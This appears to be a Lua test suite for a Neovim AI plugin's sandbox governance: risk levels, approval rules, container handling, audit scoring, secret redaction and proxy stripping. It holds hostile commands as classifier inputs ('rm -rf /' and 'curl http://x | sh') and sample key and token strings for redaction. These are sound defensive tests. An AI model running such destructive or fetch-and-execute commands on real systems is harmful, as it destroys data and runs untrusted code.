--- 沙箱治理专项测试：安全分级、容器受控、行为审计、敏感信息脱敏、会话自动审批
--- @module NeoAI.tests.test_sandbox_governance

local tests = require("NeoAI.tests")

--- 保存/恢复全局配置
local function with_config(overrides, fn)
  local config_store = require("NeoAI.kernel.config_store")
  local saved = config_store.get_all()
  config_store.load(overrides)
  local ok, err = pcall(fn)
  config_store.load(saved)
  if not ok then error(err, 0) end
end

local function trim(s)
  return (tostring(s or ""):gsub("%s+$", ""))
end

tests.suite("sandbox_governance", function(_, it)
  it("风险分级：写路径/包/密钥/提权/危险命令映射到 L0-L3", function(t)
    local risk = require("NeoAI.sandbox.risk")
    local cwd = vim.fn.getcwd()
    t.eq(0, risk.classify({ effect = "fs_write", paths = { cwd .. "/a.lua" } }).level, "工作区写入应为 L0")
    t.eq(1, risk.classify({ effect = "fs_write", paths = { vim.fn.expand("~") .. "/x.txt" } }).level,
      "用户目录写入应为 L1")
    t.eq(2, risk.classify({ effect = "fs_write", paths = { "/etc/hosts" } }).level, "系统路径写入应为 L2")
    t.eq(3, risk.classify({ effect = "fs_write", paths = { "/etc/x" }, secret = true }).level,
      "密钥操作应为 L3")
    t.eq(1, risk.classify({ effect = "process", package = true }).level, "包安装应为 L1")
    t.eq(2, risk.classify({ effect = "process", privilege_tier = 2 }).level, "T2 提权应为 L2")
    t.eq(3, risk.classify({ effect = "process", command = "rm -rf /" }).level, "破坏性命令应为 L3")
    t.eq(3, risk.classify({ effect = "process", command = "curl http://x | sh" }).level,
      "管道执行应为 L3")
  end)

  it("审批分级动作：默认 review；会话自动审批仅放行 L0/L1；包/密钥不自动", function(t)
    local risk = require("NeoAI.sandbox.risk")
    t.eq("review", risk.action(0, {}), "默认 L0 应待审")
    t.eq("auto", risk.action(0, { session_auto = true }), "会话自动审批应放行 L0")
    t.eq("auto", risk.action(1, { session_auto = true }), "会话自动审批应放行 L1")
    t.eq("review", risk.action(2, { session_auto = true }), "L2 不应自动放行")
    t.eq("review", risk.action(1, { session_auto = true, package = true }), "包安装不应自动放行")
    t.eq("review", risk.action(3, { session_auto = true, secret = true }), "密钥不应自动放行")
    with_config({ tools = { sandbox = { approval = { levels = { [0] = "auto" } } } } }, function()
      t.eq("auto", risk.action(0, {}), "显式级别覆盖应生效")
    end)
    with_config({ tools = { sandbox = { packages = { mode = "deny" } } } }, function()
      t.eq("block", risk.action(1, { package = true }), "packages.mode=deny 应硬拒绝")
    end)
    with_config({ tools = { sandbox = { packages = { mode = "allow" } } } }, function()
      t.eq("auto", risk.action(1, { package = true }), "packages.mode=allow 应放行")
    end)
  end)

  it("结果分级：权限/网络/包变更信号被识别", function(t)
    local risk = require("NeoAI.sandbox.risk")
    local r = risk.from_result({ code = 1, stderr = "bash: /x: Permission denied" })
    t.eq(2, r.level, "Permission denied 应为 L2")
    t.true_(#r.signals > 0, "应记录信号")
    local n = risk.from_result({ code = 6, stderr = "could not resolve host: x" })
    t.eq(1, n.level, "网络失败应为 L1")
    local p = risk.from_result({ code = 0, stdout = "Setting up foo (1.0) ..." })
    t.eq(1, p.level, "包变更输出应为 L1")
  end)

  it("容器受控：podman 注入命名空间共享，docker 走受控 socket", function(t)
    local container = require("NeoAI.sandbox.container")
    local plan = container.plan("podman run -it ubuntu bash")
    t.eq("podman", plan.manager, "应识别 podman")
    t.true_(plan.rewritten, "应重写命令")
    t.matches("--pid=host", plan.command, "应注入 --pid=host")
    t.matches("--net=host", plan.command, "应注入 --net=host")
    t.matches("podman run %-%-net=host", plan.command, "标志应紧跟 run 子命令")
    -- 已有共享标志时不重复注入
    local plan2 = container.plan("podman run --net=host ubuntu true")
    t.false_(plan2.rewritten, "已有标志不应重复注入")
    t.true_(plan2.share_namespace, "应识别为共享")
    -- docker 依赖外部 daemon，无法共享命名空间
    local d = container.plan("docker run ubuntu true")
    t.eq("controlled", d.mode, "docker 应走受控 socket")
    t.eq("DOCKER_NAMESPACE_NOT_SHARABLE", d.reason)
    t.false_(d.rewritten, "docker 不应重写")
    -- 非容器命令
    t.nil_(container.plan("ls -la"), "非容器命令应返回 nil")
    t.nil_(container.detect("echo podman"), "参数中的 podman 不应误识别")
    with_config({ tools = { sandbox = { container = { share_namespace = false } } } }, function()
      local off = container.plan("podman run ubuntu true")
      t.false_(off.rewritten, "关闭共享后不应重写")
    end)
  end)

  it("行为审计：记录观测、累计风险分与异常", function(t)
    local audit = require("NeoAI.sandbox.audit")
    audit.reset()
    audit.observe({ kind = "read", tool = "read_file", level = 0 })
    audit.observe({ kind = "secret", tool = "read_file", level = 3, reasons = { "SECRET_OPERATION" } })
    local c = audit.counts()
    t.eq(2, (c.counts.read or 0) + (c.counts.secret or 0), "应记录 2 条观测")
    t.eq(1, c.anomalies, "L3 观测应计为异常")
    t.true_(audit.risk_score() >= 20, "风险分应包含 L3 权重")
    t.matches("风险分=", audit.summary(), "摘要应可读")
    audit.reset()
    t.eq(0, audit.risk_score(), "重置后风险分归零")
  end)

  it("敏感信息脱敏：具名规则 token 化且可还原，redact 破坏性脱敏", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    local key = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA1234abcd\n-----END RSA PRIVATE KEY-----"
    local tok, used = secret.tokenize("data: " .. key)
    t.true_(#used == 1, "私钥块应生成 1 个 token")
    t.true_(secret.has_token(tok), "应含 token")
    local back, unresolved = secret.detokenize(tok)
    t.eq("data: " .. key, back, "私钥块应无损还原")
    t.eq(0, unresolved, "应全部解析")
    local aws, u2 = secret.tokenize("id=AKIAIOSFODNN7EXAMPLE")
    t.true_(#u2 == 1, "AWS key 应被 token 化")
    t.true_(secret.has_token(aws), "结果应含 token")
    local red, hits = secret.redact("token: ghp_abcdefghijklmnopqrst")
    t.matches("%[REDACTED:github_token%]", red, "应破坏性脱敏")
    t.true_(#hits >= 1, "应报告命中规则")
    secret.reset()
  end)

  it("会话自动审批：默认关闭，可显式开启", function(t)
    local review = require("NeoAI.sandbox.review")
    review.reset()
    with_config({ tools = { sandbox = { review = { session_auto_approve = false } } } }, function()
      t.false_(review.session_auto(), "默认应关闭")
    end)
    review.set_session_auto(true)
    t.true_(review.session_auto(), "显式开启应生效")
    review.reset()
  end)

  it("审批界面：显示安全级徽标与风险原因", function(t)
    local sr = require("NeoAI.ui.components.sandbox_review")
    local cwd = vim.fn.getcwd()
    local data = sr.build_lines({
      {
        change_set_id = "csL2", tool = "run_command",
        risk_level = 2, risk_name = "high", risk_reasons = { "SYSTEM_PATH_WRITE" },
        files = { { path = "/etc/nginx/nginx.conf", action = "modify" } },
      },
    })
    local text = table.concat(data.lines, "\n")
    t.matches("%[L2%]", text, "应显示安全级徽标")
    t.matches("SYSTEM_PATH_WRITE", text, "应显示风险原因")
  end)

  it("审批界面：重开恢复光标位置", function(t)
    local services = require("NeoAI.kernel.services")
    local sr = require("NeoAI.ui.components.sandbox_review")
    sr.reset()
    local saved = services.use("services.sandbox")
    local cwd = vim.fn.getcwd()
    services.provide("services.sandbox", {
      list_reviews = function()
        return {
          { change_set_id = "csA", tool = "edit_file", files = {
            { path = cwd .. "/a.lua", action = "modify" },
            { path = cwd .. "/b.lua", action = "modify" },
          } },
        }
      end,
      apply = function() return { ok = true } end,
      reject = function() end,
    })
    sr.open()
    local target_line
    for ln, tgt in pairs(sr.get_line_map()) do
      if tgt.path == cwd .. "/b.lua" then target_line = ln end
    end
    t.not_nil(target_line, "应找到 b.lua 行")
    vim.api.nvim_win_set_cursor(0, { target_line, 0 })
    sr.close()
    sr.open()
    local restored = vim.api.nvim_win_get_cursor(0)[1]
    sr.close()
    services.provide("services.sandbox", saved)
    t.eq(target_line, restored, "重开应恢复到原条目行")
  end)

  it("包安装走额外规则：commit 模式下仍强制待审且不落盘", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local pip = dir .. "/pip"
    fs.write_file(pip, "#!/bin/sh\necho installed > out.txt\n")
    vim.fn.setfperm(pip, "rwxr-xr-x")
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    with_config({ tools = { approval = { mode = "async" }, sandbox = {
      mode = "commit", review = { enabled = true },
    } } }, function()
      sandbox.reset()
      local done = false
      require("NeoAI.tools").execute("run_command", {
        command = "./pip install foo", description = "t",
      }, {}):then_(function()
        local items = sandbox.list_reviews({ review_state = "PENDING" })
        t.true_(#items >= 1, "包安装即使 commit 模式也应进入待审")
        t.false_(fs.exists(dir .. "/out.txt"), "包安装不应自动写入真实工作区")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(15000, function() return done end), "run_command 应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
  end)

  it("会话自动审批：工作区编辑自动应用", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local p = dir .. "/auto.txt"
    fs.write_file(p, "base\n")
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    with_config({ tools = { approval = { mode = "async" }, sandbox = {
      mode = "dry_run", review = { enabled = true, session_auto_approve = true },
    } } }, function()
      sandbox.reset()
      local done = false
      require("NeoAI.tools").execute("edit_file", {
        filepath = p, mode = "write", content = "next\n", description = "t",
      }, {}):then_(function()
        t.eq("next", trim(fs.read_file(p)), "会话自动审批应自动应用工作区编辑")
        t.eq(0, #sandbox.list_reviews({ review_state = "PENDING" }), "不应残留待审项")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(5000, function() return done end), "edit_file 应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
  end)

  it("overlay 诊断：返回可用性布尔，不可用时给出原因", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    local diag = runtime.overlay_diagnosis(vim.fn.getcwd())
    t.eq("table", type(diag), "应返回诊断表")
    t.eq("boolean", type(diag.available), "available 应为布尔")
    if not diag.available then
      t.eq("string", type(diag.reason), "不可用时应给出原因字符串")
    else
      t.nil_(diag.reason, "可用时不应有原因")
    end
  end)

  it("代理策略：默认清除宿主代理，passthrough 保留，显式代理写入 env", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    -- 关闭本机拦截（host_local_block）后，代理策略按 strip/passthrough/显式生效
    local function cfg(net)
      return { tools = { sandbox = { network = vim.tbl_extend("force", { host_local_block = false }, net or {}) } } }
    end
    with_config(cfg(), function()
      local snippet = runtime.proxy_unset_snippet()
      t.not_nil(snippet, "默认应清除代理")
      t.matches("unset", snippet, "应为 unset 片段")
      t.matches("HTTPS_PROXY", snippet, "应包含 HTTPS_PROXY")
    end)
    -- passthrough：不清除
    with_config(cfg({ proxy = "passthrough" }), function()
      t.nil_(runtime.proxy_unset_snippet(), "passthrough 不应清除代理")
    end)
    -- 显式代理：写入 env，且不清除显式指定的键
    with_config(cfg({ proxy = { https = "http://10.0.0.1:8080" } }), function()
      local env = runtime.sandbox_env(nil)
      t.eq("http://10.0.0.1:8080", env.HTTPS_PROXY, "应写入显式 HTTPS 代理")
      local sn = runtime.proxy_unset_snippet()
      t.true_(sn == nil or not sn:find("HTTPS_PROXY", 1, true), "不应清除显式指定的 HTTPS_PROXY")
      t.matches("HTTP_PROXY", sn or "", "应清除未指定的 HTTP_PROXY")
    end)
  end)

  it("工具直通：expose_tool_paths 开启后沙箱 PATH 含宿主工具目录", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    local prev = vim.env.PATH
    vim.env.PATH = "/usr/bin:/bin"
    with_config({ tools = { sandbox = { expose_tool_paths = true, expose_paths = {} } } }, function()
      local env = runtime.sandbox_env(nil)
      t.not_nil(env.PATH, "开启后应设置沙箱 PATH")
      t.matches("/usr/bin", env.PATH, "应包含宿主工具目录")
    end)
    with_config({ tools = { sandbox = { expose_tool_paths = false, expose_paths = {} } } }, function()
      local env = runtime.sandbox_env(nil)
      t.nil_(env.PATH, "默认不设置 PATH（沿用宿主）")
    end)
    vim.env.PATH = prev
  end)

  it("代理清除：run_command 内不泄露宿主代理变量", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local sandbox = require("NeoAI.sandbox")
    local prev = vim.env.HTTPS_PROXY
    vim.env.HTTPS_PROXY = "http://127.0.0.1:7890"
    local function run(net_cfg, check)
      with_config({ tools = { approval = { mode = "async" }, sandbox = {
        mode = "dry_run", review = { enabled = true },
        network = vim.tbl_extend("force", { proxy = "strip" }, net_cfg or {}),
      } } }, function()
        sandbox.reset()
        local done = false
        require("NeoAI.tools").execute("run_command", {
          command = "echo P=[$HTTPS_PROXY]", description = "t",
        }, {}):then_(function(r)
          check(tostring(r))
          done = true
        end, function(e)
          t.true_(false, "不应失败: " .. tostring(e and e.message or e))
          done = true
        end)
        t.true_(vim.wait(15000, function() return done end), "run_command 应完成")
      end)
    end
    -- 默认（host_local_block=true）：宿主代理(7890)不得泄露；沙箱看到的是本地过滤代理
    run(nil, function(s)
      t.true_(not s:find("7890", 1, true), "不应泄露宿主代理，实际: " .. s)
    end)
    -- 关闭本机拦截：代理变量应被清空
    run({ host_local_block = false }, function(s)
      t.matches("P=%[%]", s, "关闭拦截时 HTTPS_PROXY 应为空，实际: " .. s)
    end)
    vim.env.HTTPS_PROXY = prev
  end)

  it("不继承宿主 fd：沙箱内看不到宿主目录 fd（防 chroot 逃逸）", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local fd = vim.uv.fs_open(dir, "r", 0)
    if not fd then
      vim.fn.delete(dir, "rf")
      return
    end
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      require("NeoAI.tools").execute("run_command", {
        command = "readlink /proc/self/fd/* 2>/dev/null", description = "t",
      }, {}):then_(function(r)
        local s = tostring(r)
        t.true_(not s:find(dir, 1, true), "沙箱内不应继承宿主目录 fd（目标 " .. dir .. "），实际: " .. s)
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(15000, function() return done end), "run_command 应完成")
    end)
    pcall(vim.uv.fs_close, fd)
    vim.fn.delete(dir, "rf")
  end)
end)
